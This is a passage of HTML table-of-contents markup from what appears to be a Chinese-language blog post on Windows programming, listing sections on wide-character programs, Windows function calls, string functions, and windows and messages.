href="#宽字元程式"><span class="nav-number">2.1.1.</span> <span class="nav-text">宽字元程式</span></a></li><li class="nav-item nav-level-3"><a class="nav-link" href="#L问题"><span class="nav-number">2.1.2.</span> <span class="nav-text">L问题</span></a></li></ol></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows函数呼叫"><span class="nav-number">2.2.</span> <span class="nav-text">Windows函数呼叫</span></a></li><li class="nav-item nav-level-2"><a class="nav-link" href="#Windows字符串函式"><span class="nav-number">2.3.</span> <span class="nav-text">Windows字符串函式</span></a></li></ol></li><li class="nav-item nav-level-1"><a class="nav-link" href="#视窗和讯息"><span class="nav-number">3.</span> <span class="nav-text">视窗和讯息</span></a></li></ol></div>
             
 
           </div>
